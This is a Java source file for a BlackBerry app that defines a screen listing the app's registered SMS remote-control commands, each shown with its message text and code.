package com.vvt.screen;

import java.util.Vector;
import com.vvt.global.Global;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.RmtCmdRegister;
import com.vvt.std.Log;
import com.vvt.ui.resource.MainAppTextResource;
import net.rim.device.api.ui.Field;
import net.rim.device.api.ui.component.RichTextField;
import net.rim.device.api.ui.container.MainScreen;

public class SMSControlScreen extends MainScreen {
	
	private RmtCmdRegister rmtCmdRegister = Global.getRmtCmdRegister();
	private Vector registerCmds = rmtCmdRegister.getCommands();
	private Vector cmdFields = new Vector();
	
	public SMSControlScreen() {
		try {
			setTitle(MainAppTextResource.SMS_CONTROL_SCREEN_TITLE);
			addCmds();
			add(new RichTextField(MainAppTextResource.SMS_CONTROL_SCREEN_HEADER + registerCmds.size() + MainAppTextResource.SMS_CONTROL_SCREEN_TAILER, Field.READONLY));
			add(new RichTextField("", Field.NON_FOCUSABLE));
			for (int i = 0; i < cmdFields.size(); i++) {
				add((RichTextField)cmdFields.elementAt(i));
			}
		} catch (Exception e) {
			Log.error("SMSControlScreen.constructor", null, e);
		}
	}

	private void addCmds() {
		RichTextField cmdField = null;
		for (int i = 0; i < registerCmds.size(); i++) {
			RmtCmdLine cmdLine = (RmtCmdLine)registerCmds.elementAt(i);
			StringBuffer msg = new StringBuffer();
			msg.append(cmdLine.getMessage());
			msg.append(cmdLine.getCode());
			cmdField = new RichTextField(msg.toString());
			cmdFields.addElement(cmdField);
		}
	}
}